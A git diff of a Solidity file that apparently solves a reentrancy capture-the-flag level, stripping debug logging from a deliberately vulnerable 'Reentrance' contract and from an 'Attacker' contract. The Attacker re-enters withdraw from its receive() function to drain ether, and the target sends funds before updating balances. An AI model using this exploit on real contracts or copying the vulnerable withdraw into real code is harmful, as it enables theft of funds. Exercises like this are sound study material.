@@ -2,7 +2,6 @@
 pragma solidity ^0.6.0;
 
 import "@openzeppelin/contracts/math/SafeMath.sol";
-import "hardhat/console.sol";
 
 contract Reentrance {
     using SafeMath for uint256;
@@ -17,9 +16,6 @@ contract Reentrance {
     }
 
     function withdraw(uint _amount) public {
-        console.log(msg.sender);
-        console.log(_amount);
-        console.log(address(this).balance);
         if (balances[msg.sender] >= _amount) {
             (bool result, ) = msg.sender.call.value(_amount)("");
             if (result) {
@@ -33,24 +29,20 @@ contract Reentrance {
 }
 
 contract Attacker {
-    address targetAddr;
+    address public targetAddr;
 
-    constructor(address _targetAddr) public payable {
-        targetAddr = _targetAddr;
+    constructor(address addr) public payable {
+        targetAddr = addr;
         // donate
         targetAddr.call.value(msg.value)(abi.encodeWithSignature("donate(address)", this));
     }
 
     function withdraw(uint256 amount) public {
         // withdraw
-        (bool success, ) = targetAddr.call(abi.encodeWithSignature("withdraw(uint256)", amount));
-
-        console.log(success);
+        (bool success, ) = targetAddr.call(abi.encodeWithSignature("withdraw(uint256)", amount));        
     }
 
-    receive() external payable {
-        console.log("Received!");
-        console.log(msg.value);
+    receive() external payable {        
         msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
     }
 }
